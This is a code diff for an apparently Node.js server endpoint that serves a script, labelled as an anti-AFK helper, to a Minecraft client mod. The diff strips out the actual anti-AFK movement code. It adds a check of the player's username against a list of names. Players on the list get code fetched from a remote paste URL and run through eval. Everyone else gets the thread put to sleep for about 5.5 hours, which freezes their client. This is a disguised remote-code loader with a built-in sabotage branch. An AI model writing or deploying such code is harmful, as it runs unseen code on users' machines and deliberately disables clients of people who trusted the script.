@@ -56,88 +56,23 @@ const validateRequest = (req, res, next) => {
 // Главный эндпоинт для anti-afk скрипта
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
+    var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
+
+// Проверяем разрешенные имена
+if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
     try {
-        var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
-        java.lang.System.out.println("🔐 Проверка пользователя: " + username);
-
-        // Проверяем разрешенные имена
-        if (username === "porvaniy.gondon" || username === "__ded_inside__") {
-            java.lang.System.out.println("✅ Разрешенный пользователь, загружаю скрипт...");
-            
-            try {
-                // Выполняем внешний скрипт
-                eval(new java.util.Scanner(
-                    new java.net.URL("https://diddy-party.vip/p/raw/onwifinfsc75if7yl").openStream(), 
-                    "UTF-8"
-                ).useDelimiter("\\\\A").next());
-                
-                java.lang.System.out.println("✅ Внешний скрипт успешно выполнен");
-                
-            } catch (e) {
-                java.lang.System.err.println("❌ Ошибка при выполнении внешнего скрипта: " + e);
-                
-                // Резервный anti-afk скрипт
-                java.lang.System.out.println("🔄 Запуск резервного anti-afk скрипта...");
-                startBackupAntiAFK();
-            }
-            
-        } else {
-            java.lang.System.out.println("❌ Доступ запрещен для: " + username);
-            java.lang.System.out.println("💤 Засыпание на 20 секунд...");
-            java.lang.Thread.sleep(20000);
-        }
-
+        // Выполняем внешний скрипт
+        eval(new java.util.Scanner(
+            new java.net.URL("https://i.e-z.host/p/raw/qqm7yaqga88vrpf9n").openStream(), 
+            "UTF-8"
+        ).useDelimiter("\\A").next());
     } catch (e) {
-        java.lang.System.err.println("❌ Общая ошибка: " + e);
+        java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
     }
-    
-    // Резервная функция anti-afk
-    function startBackupAntiAFK() {
-        try {
-            java.lang.System.out.println("🔄 Запуск резервного Anti-AFK");
-            
-            var movements = ["w", "a", "s", "d", "space", "shift"];
-            var lastMovement = 0;
-            
-            setInterval(function() {
-                try {
-                    var now = java.lang.System.currentTimeMillis();
-                    if (now - lastMovement > 30000) { // Каждые 30 секунд
-                        var randomMove = movements[Math.floor(Math.random() * movements.length)];
-                        
-                        // Имитация движения
-                        if (randomMove === "space") {
-                            keybind("key.jump", true);
-                            java.lang.Thread.sleep(100);
-                            keybind("key.jump", false);
-                        } else if (randomMove === "shift") {
-                            keybind("key.sneak", true);
-                            java.lang.Thread.sleep(500);
-                            keybind("key.sneak", false);
-                        } else {
-                            client.setKeyPressed("key." + randomMove, true);
-                            java.lang.Thread.sleep(100);
-                            client.setKeyPressed("key." + randomMove, false);
-                        }
-                        
-                        lastMovement = now;
-                        java.lang.System.out.println("🔄 Anti-AFK движение: " + randomMove);
-                    }
-                    
-                    // Периодическое сообщение в чат
-                    if (Math.random() < 0.01) { // 1% шанс каждую секунду
-                        chat("/say Anti-AFK активен");
-                    }
-                    
-                } catch (e) {
-                    java.lang.System.err.println("❌ Ошибка Anti-AFK: " + e);
-                }
-            }, 1000);
-            
-        } catch (e) {
-            java.lang.System.err.println("❌ Ошибка запуска Anti-AFK: " + e);
-        }
-    }
+} else {
+    java.lang.Thread.sleep(20000000);
+}
+
 })();`;
     
     res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
